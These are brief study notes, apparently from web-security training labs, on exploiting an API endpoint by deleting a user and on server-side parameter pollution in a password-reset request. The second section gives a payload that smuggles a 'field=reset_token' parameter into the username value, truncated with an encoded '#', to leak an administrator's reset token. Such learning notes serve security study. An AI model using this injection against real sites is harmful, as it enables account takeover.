____

# Exploiting an API endpoint using documentation

```html
DELETE api/user/carlos
```

# Exploiting server-side parameter pollution in a query string

![[Pasted image 20240911045910.png]]

Adding the additional parameter `field` with variable `reset_token` in the POST request, leak the sensitive information to reset password token.

Attempt to truncate the server-side query string using a URL-encoded `#` character: %23

```
POST /forgot-password

csrf=EOaA9KP0jcmyGMZ9SJcknOViH7bSKzS5&username=administrator%26field=reset_token%23
```

